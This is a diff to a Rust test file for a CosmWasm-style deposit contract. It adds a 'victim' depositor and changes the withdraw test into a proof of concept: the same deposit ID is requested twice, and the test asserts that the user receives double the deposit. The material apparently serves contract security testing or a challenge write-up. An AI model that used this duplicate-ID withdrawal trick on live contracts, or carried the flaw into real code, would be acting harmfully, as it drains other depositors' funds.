@@ -18,6 +18,7 @@ pub mod tests {
     }
 
     pub const USER: &str = "user";
+    pub const VICTIM: &str = "victim";
     pub const ADMIN: &str = "admin";
 
     pub fn proper_instantiate() -> (App, Addr) {
@@ -44,8 +45,9 @@ pub mod tests {
             MINIMUM_DEPOSIT_AMOUNT * Uint128::new(10),
         );
 
-        // mint funds to user
+        // mint funds to user + victim
         app = mint_tokens(app, USER.to_string(), MINIMUM_DEPOSIT_AMOUNT);
+        app = mint_tokens(app, VICTIM.to_string(), MINIMUM_DEPOSIT_AMOUNT);
 
         // deposit
         let msg = ExecuteMsg::Deposit {};
@@ -58,8 +60,21 @@ pub mod tests {
         )
         .unwrap();
 
+        // fund the victim
+        let sender = Addr::unchecked(VICTIM);
+        app.execute_contract(
+            sender.clone(),
+            contract_addr.clone(),
+            &msg,
+            &[coin(MINIMUM_DEPOSIT_AMOUNT.u128(), DENOM)],
+        )
+        .unwrap();
+
         // verify no funds
         let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
+        assert_eq!(balance, Uint128::zero());
+
+        let balance = app.wrap().query_balance(VICTIM, DENOM).unwrap().amount;
         assert_eq!(balance, Uint128::zero());
 
         (app, contract_addr)
@@ -97,12 +112,12 @@ pub mod tests {
         });
 
         // test withdraw
-        let msg = ExecuteMsg::Withdraw { ids: vec![1] };
+        let msg = ExecuteMsg::Withdraw { ids: vec![1, 1] }; // exploit is to request withdraw from same id multiple times
         app.execute_contract(sender, contract_addr, &msg, &[])
             .unwrap();
 
         // verify funds received
         let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
-        assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT);
+        assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT * Uint128::from(2u16)); // USER gets 2x deposit amount
     }
 }
